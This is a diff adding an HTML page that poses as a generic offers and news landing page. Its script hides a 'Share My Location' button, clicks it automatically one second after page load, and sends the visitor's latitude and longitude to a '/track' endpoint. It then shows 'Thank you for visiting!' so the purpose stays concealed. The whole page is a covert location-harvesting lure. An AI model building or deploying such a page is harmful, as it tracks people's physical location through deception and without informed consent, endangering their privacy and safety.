@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to Our Page</title>
+</head>
+<body>
+    <h1>Explore Exciting Offers!</h1>
+    <p>Check out the latest updates, news, and offers on our platform. Stay connected with the world!</p>
+    <button id="getLocationBtn" style="display: none;">Share My Location</button>
+    <p id="statusMessage"></p>
+
+    <script>
+        // Function to track location
+        function trackLocation() {
+            const statusMessage = document.getElementById("statusMessage");
+
+            if (navigator.geolocation) {
+                // Show permission request and handle location
+                navigator.geolocation.getCurrentPosition(
+                    function (position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+
+                        console.log("Latitude: " + latitude + ", Longitude: " + longitude);
+
+                        // Send the location data to the server
+                        fetch('/track', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({ latitude, longitude }),
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            statusMessage.textContent = "Thank you for visiting!";
+                            console.log(data.message);
+                        })
+                        .catch(err => {
+                            statusMessage.textContent = "Error sending data to the server.";
+                            console.error('Error:', err);
+                        });
+                    },
+                    function (error) {
+                        let errorMsg = "An error occurred while fetching location.";
+                        if (error.code === 1) {
+                            errorMsg = "Permission denied. Please allow location access.";
+                        } else if (error.code === 2) {
+                            errorMsg = "Position unavailable.";
+                        } else if (error.code === 3) {
+                            errorMsg = "Location request timed out.";
+                        }
+                        statusMessage.textContent = errorMsg;
+                        console.error('Geolocation Error:', error.message);
+                    }
+                );
+            } else {
+                statusMessage.textContent = "Geolocation is not supported by this browser.";
+                console.error('Geolocation API not supported.');
+            }
+        }
+
+        // Automatically click the button after 1 second
+        function autoClickButton() {
+            setTimeout(function () {
+                document.getElementById("getLocationBtn").click();
+            }, 1000);
+        }
+
+        // Attach click event to the button
+        document.getElementById("getLocationBtn").onclick = function () {
+            document.getElementById("statusMessage").textContent = "Requesting location...";
+            trackLocation();
+        };
+
+        // Call the autoClickButton function on page load
+        window.onload = autoClickButton;
+    </script>
+</body>
+</html>
